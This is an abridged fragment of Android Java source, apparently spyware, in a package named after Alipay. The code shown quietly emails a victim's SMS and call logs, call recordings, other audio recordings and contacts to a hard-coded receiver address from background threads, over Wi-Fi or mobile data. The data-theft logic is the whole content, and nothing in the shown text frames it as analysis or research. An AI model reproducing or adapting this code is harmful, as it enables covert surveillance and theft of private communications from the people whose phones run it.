...
import com.alipay.safe.receiver.Globle;
		...
		if (uploadEvenIfMobile || Globle.isConnectInternetWifi(con)) {
			new Thread(new Runnable() {
				...
				public void run() {
					...
					try {
						sendMail("短信通话记录", "短信通话记录", Globle.receiverEmail, files);
		...
		if (uploadEvenIfMobile || Globle.isConnectInternetWifi(con)) {
			new Thread(new Runnable() {
				...
				public void run() {
					...
					try {
						sendMail("通话录音", "通话录音", Globle.receiverEmail, files);
		...
		if (uploadEvenIfMobile || Globle.isConnectInternetWifi(con)) {
			new Thread(new Runnable() {
				...
				public void run() {
					...
					try {
						sendMail("其它录音", "其它录音", Globle.receiverEmail, files);
		...
		if (uploadEvenIfMobile || Globle.isConnectInternetWifi(con)) {
			new Thread(new Runnable() {
				...
				public void run() {
					...
					try {
						sendMail("所有", "所有", Globle.receiverEmail, files);
		...
		if (uploadEvenIfMobile || Globle.isConnectInternetWifi(con)) {
			new Thread(new Runnable() {
				...
				public void run() {
					...
					try {
						sendMail("联系人", "联系人", Globle.receiverEmail, files);
